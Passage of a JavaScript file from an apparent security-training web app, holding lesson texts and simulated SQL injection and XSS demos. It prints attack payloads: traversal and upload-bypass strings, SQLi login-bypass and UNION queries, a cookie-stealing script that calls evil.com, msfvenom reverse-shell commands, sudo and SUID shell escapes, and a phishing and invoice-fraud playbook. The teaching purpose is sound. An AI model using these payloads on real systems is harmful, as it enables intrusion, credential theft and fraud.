                    <li>Set expiry dates on tokens</li>
                    <li>Use centralized session stores for load-balanced environments</li>
                    <li>Regenerate session ID after login</li>
                </ul>`,

            'clickjacking': `
                <h2>Clickjacking</h2>
                <p>Clickjacking tricks users into clicking something different from what they see by overlaying a <strong>transparent iframe</strong> on top of a visible page.</p>
                <h3>How It Works</h3>
                <pre class="code-example">&lt;!-- Attacker's page --&gt;
&lt;style&gt;
iframe {
  position: absolute;
  opacity: 0;        /* Invisible! */
  z-index: 1;        /* On top */
  width: 100%;
  height: 100%;
}
&lt;/style&gt;
&lt;iframe src="https://bank.com/transfer"&gt;&lt;/iframe&gt;
&lt;button&gt;Click here for a free prize!&lt;/button&gt;
&lt;!-- User clicks "prize" button but actually clicks
     the hidden bank transfer button --&gt;</pre>
                <h3>Mitigation</h3>
                <pre class="code-example">X-Frame-Options: DENY              # Block all framing
X-Frame-Options: SAMEORIGIN        # Only same-origin
Content-Security-Policy: frame-ancestors 'none'</pre>`,

            'directory-traversal': `
                <h2>Directory Traversal</h2>
                <p>Directory traversal extends path traversal to access files outside the intended directory using <code>../</code> sequences and encoded variants.</p>
                <h3>Encoded Bypass Techniques</h3>
                <pre class="code-example">Standard:     ../../../etc/passwd
URL Encoded:  %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
Mixed:        ..%2f..%2f..%2fetc/passwd
Double Enc:   %252e%252e%252f
Unicode:      ..%c0%af..%c0%af</pre>
                <h3>Defense</h3>
                <ul>
                    <li>Use numerical indexes mapped to files instead of user-supplied paths</li>
                    <li>Filter all variants: <code>../</code>, <code>%2e%2e%2f</code>, <code>..%c0%af</code></li>
                    <li>Canonicalize paths and verify they stay within allowed directories</li>
                </ul>`,

            'file-upload': `
                <h2>File Upload Vulnerabilities</h2>
                <p>Unrestricted file uploads allow attackers to upload executable files (web shells) and run them on the server.</p>
                <h3>Bypass Techniques</h3>
                <ul>
                    <li><strong>Double extension</strong>: <code>shell.php.jpg</code></li>
                    <li><strong>MIME manipulation</strong>: Change Content-Type in the POST request</li>
                    <li><strong>.htaccess upload</strong>: Upload config to change allowed types</li>
                    <li><strong>Null byte</strong>: <code>shell.php%00.jpg</code> (in older systems)</li>
                </ul>
                <h3>Defense</h3>
                <ul>
                    <li>Whitelist allowed file types (check extension AND magic bytes)</li>
                    <li>Rename uploaded files to random names</li>
                    <li>Store uploads outside the web root or in a database</li>
                    <li>Remove executable permissions from upload directories</li>
                    <li>Scan for malware</li>
                </ul>`,

            'vulnerability-scanners': `
                <h2>Vulnerability Scanners</h2>
                <p>Automated tools that crawl applications, attempt known attacks, and report findings.</p>
                <h3>How They Work</h3>
                <ol>
                    <li>Crawl all accessible pages and index them</li>
                    <li>Attempt attacks against every user input</li>
                    <li>Report findings with severity ratings</li>
                </ol>
                <h3>Key Warnings</h3>
                <ul>
                    <li>Configure attack categories carefully</li>
                    <li>Exclude logout links and password reset forms</li>
                    <li>Validate <strong>false positives</strong> manually</li>
                    <li>Don't assume no findings = no vulnerabilities (<strong>false negatives</strong>)</li>
                    <li>Use Web Application Firewalls (WAF) alongside secure coding</li>
                </ul>`,

            'finding-exploits': `
                <h2>Finding Existing Exploits</h2>
                <h3>Responsible Disclosure</h3>
                <ol>
                    <li>Researcher discovers vulnerability</li>
                    <li>Reports to vendor privately</li>
                    <li>Vendor patches within agreed timeline</li>
                    <li>Public disclosure with PoC (proof of concept)</li>
                </ol>
                <h3>Finding Exploits</h3>
                <pre class="code-example"># Search Google
"Apache 2.4.49 exploit"

# Exploit Database
https://exploit-db.com

# CVE Database
https://cve.mitre.org</pre>
                <div class="theory-callout danger"><strong>⚠️ WannaCry Lesson:</strong> The NSA's EternalBlue exploit was leaked. Unpatched Windows systems were devastated worldwide. Lesson: unpatched software = exploitable software!</div>`,

            'buffer-overflow-intro': `
                <h2>Introduction to Buffer Overflows</h2>
                <p>A buffer overflow occurs when a program writes more data to a memory buffer than it can hold, <strong>overwriting adjacent memory</strong>.</p>
                <h3>Why It Matters</h3>
                <p>By carefully controlling what data overwrites the <strong>return address (EIP)</strong>, an attacker can redirect program execution to their malicious code.</p>
                <pre class="code-example">// Vulnerable C code
char buf[80];
r = read(0, buf, 1000);  // Reads 1000 bytes into 80-byte buffer!

// What happens in memory:
[  buffer (80 bytes)  ][ saved EBP ][ return addr (EIP) ]
[AAAAAAA...AAAAAAAAAAAA][  AAAA    ][     AAAA          ]
                                     ↑ Overwritten!</pre>
                <div class="theory-callout danger"><strong>⚠️ Impact:</strong> Buffer overflows can give attackers complete control of a system — executing arbitrary code with the privileges of the vulnerable program.</div>`,

            'integer-overflow': `
                <h2>Integer Overflow</h2>
                <p>When an arithmetic operation produces a value outside the range of the data type, it <strong>wraps around</strong>.</p>
                <pre class="code-example">Unsigned 32-bit integer:
  Range: 0 to 4,294,967,295 (2³² - 1)
  4,294,967,295 + 1 = 0  (wraps to zero!)

Signed 32-bit integer:
  Range: -2,147,483,647 to 2,147,483,647
  MSB (Most Significant Bit) = sign bit
  2,147,483,647 + 1 = -2,147,483,648 (flips sign!)</pre>
                <h3>Security Impact</h3>
                <p>Integer overflows can bypass security checks — e.g., a length check that overflows to a small number, allowing a buffer overflow.</p>`,

            'buffer-overflow': `
                <h2>Buffer Overflow Exploitation</h2>
                <h3>Exploit Structure</h3>
                <pre class="code-example">payload = "A" * offset + EIP_address + NOP_sled + shellcode

Where:
  offset      = distance to return address
  EIP_address = address to jump to (in NOP sled)
  NOP sled    = \\x90 * 200 (landing zone)
  shellcode   = machine code to execute (e.g., /bin/sh)</pre>
                <h3>Compilation for Testing</h3>
                <pre class="code-example">gcc -m32 -fno-stack-protector -z execstack -o vuln vuln.c
echo 0 > /proc/sys/kernel/randomize_va_space  # Disable ASLR</pre>
                <div class="theory-callout danger"><strong>⚠️ Warning:</strong> Always inspect shellcode from the internet before use — it could be backdoored!</div>`,

            'buffer-overflow-mitigations': `
                <h2>Buffer Overflow Mitigations</h2>
                <h3>Modern Protections</h3>
                <ul>
                    <li><strong>Stack Canary</strong> — Random value placed before the return pointer. If overwritten, program terminates. Bypass: leak the canary value</li>
                    <li><strong>NX/DEP</strong> (No-Execute / Data Execution Prevention) — Separates stack into code and data regions. Prevents shellcode execution in data areas. Bypass: Return-Oriented Programming (ROP)</li>
                    <li><strong>ASLR</strong> (Address Space Layout Randomization) — Randomizes memory addresses each run. Bypass: info leaks, brute force, or target non-ASLR regions</li>
                </ul>
                <p>All protections are enabled by default on modern systems but <strong>all can be bypassed</strong> by skilled attackers.</p>`,

            'format-string': `
                <h2>Format String Attacks</h2>
                <p>Format string vulnerabilities occur when user input is used as the format string in functions like <code>printf()</code>.</p>
                <pre class="code-example">// VULNERABLE
printf(user_input);        // User controls format string!

// SAFE
printf("%s", user_input);  // Format specifier fixed

// Attack: enter "%x.%x.%x.%x" to READ stack memory
// Attack: enter "%n" to WRITE to memory</pre>
                <div class="theory-callout danger"><strong>⚠️ Impact:</strong> Format string attacks can read arbitrary memory AND write to arbitrary addresses — potentially more dangerous than buffer overflows!</div>`,

            'exploiting-services': `
                <h2>Exploiting FTP & Web Applications</h2>
                <h3>FTP Exploitation</h3>
                <pre class="code-example"># Reconnaissance
$ nmap -vv -sV target_ip     # Identify FTP service/version

# Search for exploits
$ searchsploit FreeFloat ftpd  # or visit exploit-db.com

# Attack chain:
junk(230 bytes) + EIP(JMP ESP) + NOPs + shellcode</pre>
                <h3>Web App Exploitation (Example: MyBB)</h3>
                <ol>
                    <li>Identify software and version (footer, headers)</li>
                    <li>Search for CVEs/exploits for that version</li>
                    <li>Login with discovered/default credentials</li>
                    <li>Exploit vulnerability (e.g., RCE via admin language editor)</li>
                </ol>`,

            'metasploit': `
                <h2>Metasploit Framework</h2>
                <p>The most widely used penetration testing framework.</p>
                <pre class="code-example"># Start Metasploit
$ msfconsole

# Find an exploit
msf6 > search ms08-067
msf6 > use exploit/windows/smb/ms08_067_netapi

# Configure
msf6 > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 > set RHOST 192.168.1.100    # Target
msf6 > set LHOST 192.168.1.50     # Your IP
msf6 > options                    # Verify settings

# Launch
msf6 > exploit</pre>
                <h3>Meterpreter Commands</h3>
                <pre class="code-example">meterpreter > sysinfo        # System info
meterpreter > getuid         # Current user
meterpreter > screenshot     # Take screenshot
meterpreter > upload file    # Upload to target
meterpreter > hashdump       # Dump password hashes</pre>`,

            'patch-cycles': `
                <h2>Patch Cycles & End of Support</h2>
                <h3>Patch Management</h3>
                <ul>
                    <li><strong>Patch cycles</strong> — Approved delay between release and implementation for testing</li>
                    <li><strong>Priority</strong> — Internet-facing systems and critical data systems first</li>
                    <li><strong>Testing</strong> — Patches can break functionality; test in staging first</li>
                </ul>
                <h3>End of Support</h3>
                <div class="theory-callout danger"><strong>⚠️ Windows XP Example:</strong> End of support means no more security patches. Known vulnerabilities (like ms08-067) will work forever on unpatched systems. Legacy systems should be isolated in VMs with no network access.</div>`,

            'social-engineering': `
                <h2>Social Engineering</h2>
                <p>Social engineering exploits <strong>human psychology</strong> rather than technical vulnerabilities. It targets the weakest link — people.</p>
                <h3>Techniques</h3>
                <ul>
                    <li><strong>Pretexting</strong> — Creating a fabricated scenario to extract info (impersonating IT support, new employee, authority figure)</li>
                    <li><strong>Baiting</strong> — Leaving infected USB drives in parking lots</li>
                    <li><strong>Quid Pro Quo</strong> — Offering something in exchange (free tech support for credentials)</li>
                    <li><strong>Tailgating</strong> — Following authorized person through a door</li>
                </ul>
                <h3>Requirements</h3>
                <p>Acting skill, psychological insight, and extensive reconnaissance about the target organization.</p>`,

            'phishing': `
                <h2>Phishing & Drive-by Downloads</h2>
                <h3>Phishing Types</h3>
                <ul>
                    <li><strong>Mass Phishing</strong> — "Spray and pray" to thousands of emails</li>
                    <li><strong>Spear Phishing</strong> — Targeted attack with personal details about the victim</li>
                    <li><strong>Whaling</strong> — Targeting executives (CEO fraud)</li>
                </ul>
                <h3>Common Vectors</h3>
                <ul>
                    <li><strong>Word Macros</strong> — Embedded code in Office documents. Trick users into clicking "Enable Content"</li>
                    <li><strong>Malicious PDFs</strong> — Embedded executables with clickable icons</li>
                    <li><strong>Target departments</strong> — HR, Legal, Accounting (they routinely open external documents)</li>
                </ul>
                <h3>Drive-by Downloads</h3>
                <p>Compromise a website the target visits, inject exploit code that targets browser vulnerabilities. Tools: Social Engineer Toolkit (SET) on Kali Linux.</p>`,

            'credential-harvesting': `
                <h2>Credential Harvesting & CEO Fraud</h2>
                <h3>Credential Harvesting</h3>
                <ol>
                    <li>Clone a legitimate login page</li>
                    <li>Host it on a similar-looking domain</li>
                    <li>Send phishing email with link to fake page</li>
                    <li>Capture credentials when victim logs in</li>
                    <li>Redirect to real site (victim doesn't notice)</li>
                </ol>
                <h3>CEO Fraud (Whaling/BEC)</h3>
                <ul>
                    <li>Monitor company communications for patterns</li>
                    <li>Wait for CFO/CEO to be unavailable (holiday, conference)</li>
                    <li>Send fake invoice/payment request from their email</li>
                    <li>Or modify account numbers in legitimate invoices</li>
                    <li>Often goes undetected for weeks or months</li>
                </ul>`,

            'privesc-intro': `
                <h2>Introduction to Privilege Escalation</h2>
                <p>Initial exploitation typically gives you <strong>low-privilege access</strong> (e.g., www-data, guest). Privilege escalation gets you <strong>root/SYSTEM</strong> access.</p>
                <h3>Linux Permissions Recap</h3>
                <pre class="code-example">$ ls -la /usr/bin/passwd
-rwsr-xr-x 1 root root 68208 ... /usr/bin/passwd
   ↑
   s = SUID bit (runs as root regardless of who executes)</pre>
                <h3>Why Escalate?</h3>
                <ul>
                    <li>Read sensitive files (/etc/shadow, database configs)</li>
                    <li>Install persistent backdoors</li>
                    <li>Pivot to other machines on the network</li>
                    <li>Disable security controls and logging</li>
                </ul>`,

            'privesc-services': `
                <h2>Exploiting Services & Kernel</h2>
                <h3>Exploiting Running Services</h3>
                <pre class="code-example"># List running processes
$ ps auxf

# Identify software versions
$ dpkg -l | grep apache
$ /usr/sbin/apache2 -v

# Search for exploits
$ searchsploit apache 2.4</pre>
                <h3>Kernel Exploits (DirtyCOW)</h3>
                <pre class="code-example"># Find kernel version
$ uname -a
Linux target 4.4.0-31-generic ...

# DirtyCOW (CVE-2016-5195)
# Race condition allowing write to read-only files
$ gcc -pthread dirty.c -o dirty -lcrypt
$ ./dirty
# Creates new root-level user</pre>`,

            'privesc-suid-sudo': `
                <h2>SUID, Sudo & Wildcard Injection</h2>
                <h3>Finding SUID Files</h3>
                <pre class="code-example">$ find / -perm -4000 -user root -type f 2>/dev/null
$ find / -perm -2000 -user root -type f 2>/dev/null  # SGID</pre>
                <h3>Sudo Exploitation</h3>
                <pre class="code-example"># If sudo allows find:
$ sudo find /etc -exec sh -i \\;
# The -exec flag runs a command for each result
# sh -i gives an interactive shell — as root!

# If sudo allows rsync:
$ sudo rsync -e sh file.c target:/path/</pre>
                <h3>Wildcard Injection</h3>
                <pre class="code-example"># Create files named like flags:
$ echo "malicious" > "-e sh file.c"
# When admin runs: rsync -t *.c remote:src/
# Shell expands to: rsync -t -e sh file.c remote:src/
# Executes file.c as a shell script!</pre>`,

            'privesc-windows': `
                <h2>Windows Privilege Escalation</h2>
                <h3>Privilege Levels</h3>
                <pre class="code-example">User → Administrator → SYSTEM
                        ↑                 ↑
                   Can be prompted    No restrictions,
                   by UAC            reserved for OS</pre>
                <h3>Techniques</h3>
                <ul>
                    <li><strong>UAC Bypass</strong> — Trigger UAC prompt or use PowerShell bypass</li>
                    <li><strong>Kernel Exploits</strong> — Enumerate patches: <code>post/windows/gather/enum_patches</code></li>
                    <li><strong>Stored Credentials</strong> — Check <code>unattend.xml</code>, <code>sysprep.xml</code> for Base64 passwords</li>
                    <li><strong>Unquoted Service Paths</strong> — Windows tries paths sequentially if unquoted</li>
                    <li><strong>Weak Registry Permissions</strong> — Modify service ImagePath</li>
                    <li><strong>AlwaysInstallElevated</strong> — Install MSI as SYSTEM if both HKCU and HKLM keys = 0x1</li>
                </ul>`,

            'privesc-paths-registry': `
                <h2>Unquoted Service Paths & Registry</h2>
                <h3>Unquoted Service Paths</h3>
                <pre class="code-example"># Find vulnerable services:
wmic service get name,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\\Windows\\\\"

# If path is: C:\\Program Files\\Vuln Service\\service.exe
# Windows tries:
1. C:\\Program.exe
2. C:\\Program Files\\Vuln.exe
3. C:\\Program Files\\Vuln Service\\service.exe

# Check permissions:
icacls "C:\\Program Files\\Vuln Service"
# Look for Everyone:(F) or user with Full Control</pre>
                <h3>Weak Registry Permissions</h3>
                <pre class="code-example"># Service registry key:
HKLM\\SYSTEM\\CurrentControlSet\\Services\\&lt;NAME&gt;

# If writable, change ImagePath to point to
# your malicious executable</pre>`,

            'privesc-weak-perms': `
                <h2>Weak Permissions & AlwaysInstallElevated</h2>
                <h3>Weak Folder Permissions</h3>
                <ol>
                    <li>Check service executable folder permissions with <code>icacls</code></li>
                    <li>Generate malicious executable: <code>msfvenom -p windows/meterpreter/reverse_tcp -f exe -o program.exe</code></li>
                    <li>Replace the service executable</li>
                    <li>Start listener and restart the service</li>
                </ol>
                <h3>AlwaysInstallElevated</h3>
                <pre class="code-example"># Check if enabled (BOTH must be 0x1):
reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated

# If enabled:
msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=IP LPORT=PORT -o mal.exe
msfvenom -f msi-nouac -p windows/exec cmd="C:\\path\\mal.exe" > mal.msi
# Upload and execute .msi → SYSTEM shell!</pre>`,

        };
        const strippedSlug = slug.replace(/-101$/, '');
        const result = theories[slug] || theories[strippedSlug];
        if (result) return result;

        // Try partial matches for compound slugs like 'broken-auth' -> 'broken-authentication'
        for (const key of Object.keys(theories)) {
            if (theories[key] && (key.startsWith(strippedSlug) || strippedSlug.startsWith(key))) return theories[key];
        }
        return `<h2>${esc(lesson.title)}</h2><p>${esc(lesson.description || 'Content for this lesson is being prepared.')}</p>`;
    }

    /* ============================================================
       INTERACTIVE DEMOS
       ============================================================ */
    function renderDemo(lesson) {
        const pane = $('#pane-demo');
        const slug = lesson.slug || '';
        const demoKey = (lesson.demoHtml || slug).replace('-demo', '');
        const generators = {
            'sql-injection': demoSQLi,
            'sqli-demo': demoSQLi,
            'sqli': demoSQLi,
            'cross-site-scripting': demoXSS,
            'xss-demo': demoXSS,
            'xss': demoXSS,
            'csrf-attack': demoCSRF,
            'csrf-demo': demoCSRF,
            'csrf': demoCSRF,
            'broken-authentication': demoBrokenAuth,
            'brokenauth-demo': demoBrokenAuth,
            'brokenauth': demoBrokenAuth,
            'auth-demo': demoBrokenAuth,
            'auth': demoBrokenAuth,
            'broken-auth-101': demoBrokenAuth,
            'idor': demoIDOR,
            'idor-demo': demoIDOR,
            'command-injection': demoCmdInjection,
            'cmdi-demo': demoCmdInjection,
            'cmdi': demoCmdInjection,
            'path-traversal': demoPathTraversal,
            'path-demo': demoPathTraversal,
            'path': demoPathTraversal,
            'security-misconfiguration': demoMisconfig,
            'misconfig-demo': demoMisconfig,
            'misconfig': demoMisconfig,
            'sql-injection-101': demoSQLi,
            'xss-101': demoXSS,
            'csrf-101': demoCSRF,
            'broken-auth-101': demoBrokenAuth,
            'idor-101': demoIDOR,
            'command-injection-101': demoCmdInjection,
            'path-traversal-101': demoPathTraversal,
            'security-misconfig-101': demoMisconfig,
            'file-inclusion': demoFileInclusion,
            'file-inclusion-101': demoFileInclusion,
            'lfi': demoFileInclusion,
            'fi-demo': demoFileInclusion,

            // C1 Demos
            'motherboard-demo': demoBoardSize,
            'motherboards': demoBoardSize,
            'cpu-demo': demoCPU,
            'cpus-processing': demoCPU,
            'ram-demo': demoRAM,
            'ram-storage': demoRAM,
            'binary-demo': demoBinary,
            'bits-bytes-bases': demoBinary,
            'ascii-demo': demoASCII,
            'ascii-encoding': demoASCII,
            'base64-demo': demoBase64,
            'base64-encoding': demoBase64,
            'fileheader-demo': demoFileHeaders,
            'file-headers': demoFileHeaders,
            'logic-demo': demoLogicGates,
            'boolean-logic': demoLogicGates,
            'xor-demo': demoXOR,
            'xor-encryption': demoXOR,
            'fs-demo': demoFileSystems,
            'file-systems-overview': demoFileSystems,
            'cloud-demo': demoCloud,
            'cloud-models': demoCloud,
            // C2 Demos
            'os-demo': demoOS,
            'os-fundamentals': demoOS,
            'vm-demo': demoVM,
            'vms-hypervisors': demoVM,
            // C3 Demos
            'terminal-demo': demoTerminal,
            'linux-terminal': demoTerminal,
            'sudo-demo': demoSudo,
            'superuser-sudo': demoSudo,
            'folders-demo': demoFolders,
            'linux-folders': demoFolders,
            'permissions-demo': demoPermissions,
            'file-permissions': demoPermissions,
            'env-demo': demoEnvVars,
            'env-variables': demoEnvVars,
            'fileops-demo': demoFileOps,
            'file-operations': demoFileOps,
            'search-demo': demoSearch,
            'search-commands': demoSearch,
            'process-demo': demoProcesses,
            'processes': demoProcesses,
            'pipes-demo': demoPipes,
            'pipes-redirects': demoPipes,
            'ssh-demo': demoSSH,
            'ssh-building': demoSSH,
            // C4 Demos
            'dorks-demo': demoDorks,
            'google-dorks': demoDorks,
            'http-demo': demoHTTP,
            'http-protocol': demoHTTP,
            'cookies-demo': demoCookies,
            'cookies-storage': demoCookies,
            // C5 Demos
            'hardware-demo': demoNetHardware,
            'network-hardware': demoNetHardware,
            'ip-demo': demoIP,
            'ip-addresses': demoIP,
            'tcpudp-demo': demoTCPUDP,
            'tcp-vs-udp': demoTCPUDP,
            'subnet-demo': demoSubnet,
            'subnetting': demoSubnet,
            'spf-demo': demoSPF,
            'email-spoofing-spf': demoSPF,
            'dns-demo': demoDNS,
            'dns-records': demoDNS,
            'osi-demo': demoOSI,
            'osi-model': demoOSI,
            'dos-demo': demoDoS,
            'dos-attacks': demoDoS,
            // C6 new demos
            'session-demo': demoSessionGuessing,
            'session-guessing': demoSessionGuessing,
            'clickjack-demo': demoClickjack,
            'clickjacking': demoClickjack,
            'dirtraversal-demo': demoDirTraversal,
            'directory-traversal': demoDirTraversal,
            'upload-demo': demoFileUpload,
            'file-upload': demoFileUpload,
            'bof-demo': demoBOF,
            'buffer-overflow-intro': demoBOF,
            'intoverflow-demo': demoIntOverflow,
            'integer-overflow': demoIntOverflow,
            'msf-demo': demoMetasploit,
            'metasploit': demoMetasploit,
            'phishing-demo': demoPhishing,
            'phishing': demoPhishing,
            'privesc-demo': demoPrivEsc,
            'privesc-intro': demoPrivEsc,
            'suid-demo': demoSUID,
            'privesc-suid-sudo': demoSUID,
            'winprivesc-demo': demoWinPrivEsc,
            'privesc-windows': demoWinPrivEsc,
        };

        const gen = generators[slug] || generators[demoKey];
        if (gen) {
            gen(pane, lesson);
        } else {
            pane.innerHTML = '<div class="empty-state"><div class="icon">🎯</div><p>Demo for this lesson is coming soon.</p></div>';
        }
    }

    /* -- SQL Injection Demo -- */
    function demoSQLi(pane) {
        pane.innerHTML = `
            <div class="demo-interactive">
                <div class="demo-header-bar">
                    <span class="demo-badge demo-badge-danger">⚠ VULNERABLE</span>
                    <span class="demo-title">SQL Injection – Login Bypass</span>
                </div>
                <div class="demo-steps-bar">
                    <button class="demo-step-btn active" data-step="1">1. Normal Login</button>
                    <button class="demo-step-btn" data-step="2">2. SQLi Attack</button>
                    <button class="demo-step-btn" data-step="3">3. Data Extraction</button>
                </div>

                <div class="demo-visual">
                    <div class="demo-browser">
                        <div class="browser-bar">
                            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                            <span class="browser-url">https://shop.example.com/login</span>
                        </div>
                        <div class="browser-content" id="demoAppContent">
                            <div class="demo-login-form">
                                <h4>🛒 ShopSecure</h4>
                                <p class="demo-subtitle">Customer Login</p>
                                <div class="demo-field"><label>Username</label><input class="demo-input" id="demoUser" value="admin"></div>
                                <div class="demo-field"><label>Password</label><input class="demo-input" id="demoPass" value="password123"></div>
                                <button class="demo-btn" style="width:100%;margin-top:8px" id="demoLoginBtn">Login</button>
                                <div class="demo-status" id="demoStatus"></div>
                            </div>
                        </div>
                    </div>
                    <div class="demo-sql-panel">
                        <div class="panel-header">📝 SQL Query Executed</div>
                        <div class="demo-sql-code" id="demoSql"><pre>Waiting for login attempt…</pre></div>
                        <div class="demo-result-panel hidden" id="demoResult">
                            <div class="panel-header result-header">📊 Query Result</div>
                            <div class="demo-sql-code" id="demoResultContent"></div>
                        </div>
                    </div>
                </div>

                <div class="demo-explanation" id="demoExplanation">
                    <span class="explanation-icon">💡</span>
                    <div class="explanation-text">
                        <p><strong>Step 1 – Normal Login:</strong> Click Login with normal credentials. The SQL query uses string concatenation, which is safe only when the input is benign.</p>
                    </div>
                </div>
            </div>`;

        const userI = $('#demoUser'), passI = $('#demoPass'), btn = $('#demoLoginBtn');
        const sqlBox = $('#demoSql'), status = $('#demoStatus'), resultPanel = $('#demoResult'), resultContent = $('#demoResultContent');
        const explanation = $('#demoExplanation');

        function doLogin() {
            const u = userI.value, p = passI.value;
            const query = `SELECT * FROM users\nWHERE username = '${u}'\n  AND password = '${p}'`;
            sqlBox.innerHTML = `<pre>${esc(query)}</pre>`;

            const isSqli = u.includes("'") || p.includes("'");
            const isUnion = u.toLowerCase().includes('union') || p.toLowerCase().includes('union');

            if (isUnion) {
                status.className = 'demo-status show warning';
                status.innerHTML = '⚠️ Data extracted!';
                resultPanel.classList.remove('hidden');
                resultContent.innerHTML = `<pre>| id | username  | password     | email               |
|----|-----------|--------------|---------------------|
| 1  | admin     | P@ssw0rd!    | admin@shop.com      |
| 2  | john_doe  | john123      | john@example.com    |
| 3  | jane_smith| secret99     | jane@example.com    |</pre>`;
            } else if (isSqli) {
                status.className = 'demo-status show success';
                status.innerHTML = '✅ Login successful! Welcome, admin (BYPASSED)';
                resultPanel.classList.remove('hidden');
                resultContent.innerHTML = `<pre>| id | username | role  |
|----|----------|-------|
| 1  | admin    | admin |
→ 1 row returned (authentication bypassed!)</pre>`;
            } else if (u === 'admin' && p === 'password123') {
                status.className = 'demo-status show success';
                status.innerHTML = '✅ Login successful! Welcome, admin';
                resultPanel.classList.remove('hidden');
                resultContent.innerHTML = `<pre>→ 1 row returned (legitimate login)</pre>`;
            } else {
                status.className = 'demo-status show error';
                status.innerHTML = '❌ Invalid credentials';
                resultPanel.classList.add('hidden');
            }
        }

        btn.onclick = doLogin;

        // Steps
        const steps = {
            '1': { user: 'admin', pass: 'password123', text: `<p><strong>Step 1 – Normal Login:</strong> A legitimate login attempt. The query works correctly because the input doesn't contain special characters.</p>` },
            '2': { user: "' OR '1'='1' --", pass: 'anything', text: `<p><strong>Step 2 – SQL Injection Attack:</strong> The attacker enters <code>' OR '1'='1' --</code> as the username. This modifies the WHERE clause to always be true, bypassing authentication entirely.</p><p>The <code>--</code> comments out the rest of the query, ignoring the password check.</p>` },
            '3': { user: "' UNION SELECT id,username,password,email FROM users --", pass: 'x', text: `<p><strong>Step 3 – Data Extraction:</strong> Using a UNION-based injection, the attacker extracts the entire users table, revealing all usernames and passwords in the database.</p>` },
        };

        $$('.demo-step-btn').forEach((b) => {
            b.onclick = () => {
                $$('.demo-step-btn').forEach((x) => x.classList.remove('active'));
                b.classList.add('active');
                const s = steps[b.dataset.step];
                userI.value = s.user;
                passI.value = s.pass;
                explanation.querySelector('.explanation-text').innerHTML = s.text;
                resultPanel.classList.add('hidden');
                status.className = 'demo-status';
            };
        });
    }

    /* -- XSS Demo -- */
    function demoXSS(pane) {
        pane.innerHTML = `
            <div class="demo-interactive">
                <div class="demo-header-bar">
                    <span class="demo-badge demo-badge-danger">⚠ VULNERABLE</span>
                    <span class="demo-title">Cross-Site Scripting – Stored XSS</span>
                </div>
                <div class="demo-steps-bar">
                    <button class="demo-step-btn active" data-step="1">1. Normal Comment</button>
                    <button class="demo-step-btn" data-step="2">2. XSS Attack</button>
                    <button class="demo-step-btn" data-step="3">3. Cookie Theft</button>
                </div>
                <div class="demo-visual">
                    <div class="demo-browser" style="flex:2">
                        <div class="browser-bar">
                            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                            <span class="browser-url">https://social.example.com/post/12345</span>
                        </div>
                        <div class="browser-content demo-social">
                            <div class="demo-post">
                                <div class="demo-post-header"><strong>@alice</strong> <span class="demo-time">2h ago</span></div>
                                <p>Just finished the new security course! 🎉</p>
                            </div>
                            <div class="demo-comments" id="xssComments">
                                <div class="demo-comment"><strong>@bob:</strong> Congrats! 👏</div>
                            </div>
                            <div class="demo-comment-form">
                                <input class="demo-input" id="xssInput" placeholder="Add a comment…" style="flex:1">
                                <button class="demo-btn demo-btn-sm" id="xssPostBtn">Post</button>
                            </div>
                        </div>
                    </div>
                    <div class="demo-sql-panel" style="flex:1">
                        <div class="panel-header">🔍 Page Source / Console</div>
                        <div class="demo-sql-code" id="xssConsole"><pre>// Waiting for comment…</pre></div>
                    </div>
                </div>
                <div class="demo-explanation" id="xssExplanation">
                    <span class="explanation-icon">💡</span>
                    <div class="explanation-text">
                        <p><strong>Step 1:</strong> Post a normal comment. The app renders it safely as text content.</p>
                    </div>
                </div>
            </div>`;

        const comments = $('#xssComments');
        const input = $('#xssInput');
        const consoleBox = $('#xssConsole');
        const explanationText = pane.querySelector('.explanation-text');

        const steps = {
            '1': { value: 'Great job Alice!', text: '<p><strong>Step 1:</strong> Normal comment – rendered as plain text. No issues here.</p>' },
            '2': { value: '<img src=x onerror="alert(\'XSS\')">', text: '<p><strong>Step 2:</strong> The attacker posts an HTML &lt;img&gt; tag with an onerror handler. Because the app uses innerHTML without sanitization, the browser executes the JavaScript.</p>' },
            '3': { value: '<script>fetch("https://evil.com/steal?c="+document.cookie)</script>', text: '<p><strong>Step 3:</strong> A more dangerous payload sends the user\'s cookies to an attacker-controlled server. Every user who views this page becomes a victim.</p>' },
        };

        $('#xssPostBtn').onclick = () => {
            const val = input.value.trim();
            if (!val) return;
            const div = el('div', 'demo-comment');
            // simulate vulnerable render
            div.innerHTML = `<strong>@attacker:</strong> ${val}`;
            comments.appendChild(div);
            consoleBox.innerHTML = `<pre>// Rendered HTML:\n${esc(val)}\n\n// Injected into DOM via innerHTML\n// ⚠ No sanitization applied</pre>`;

            if (val.includes('<script>') || val.includes('onerror')) {
                const alert = el('div', 'demo-status show warning');
                alert.innerHTML = '⚠️ JavaScript executed in victim\'s browser!';
                comments.parentElement.appendChild(alert);
            }
            input.value = '';
        };

        $$('.demo-step-btn').forEach((b) => {
            b.onclick = () => {
                $$('.demo-step-btn').forEach((x) => x.classList.remove('active'));
                b.classList.add('active');
                const s = steps[b.dataset.step];
                input.value = s.value;
                explanationText.innerHTML = s.text;
            };
        });
    }

    /* -- CSRF Demo -- */
    function demoCSRF(pane) {
        pane.innerHTML = `
            <div class="demo-interactive">
                <div class="demo-header-bar">
                    <span class="demo-badge demo-badge-danger">⚠ VULNERABLE</span>
                    <span class="demo-title">Cross-Site Request Forgery – Fund Transfer</span>
                </div>
                <div class="demo-steps-bar">
                    <button class="demo-step-btn active" data-step="1">1. Victim's Session</button>
                    <button class="demo-step-btn" data-step="2">2. Malicious Page</button>
                    <button class="demo-step-btn" data-step="3">3. Attack Result</button>
                </div>
                <div class="demo-visual">
                    <div class="demo-browser" style="flex:1">
                        <div class="browser-bar">
                            <span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span>
                            <span class="browser-url" id="csrfUrl">https://bank.example.com/dashboard</span>
                        </div>
                        <div class="browser-content" id="csrfContent">
                            <div class="demo-bank-ui">
                                <div class="bank-header"><span>🏦 SecureBank</span><span class="bank-user">Welcome, Alice</span></div>
                                <div class="bank-balance"><strong>Balance:</strong> $<span id="csrfBalance">5,000.00</span></div>
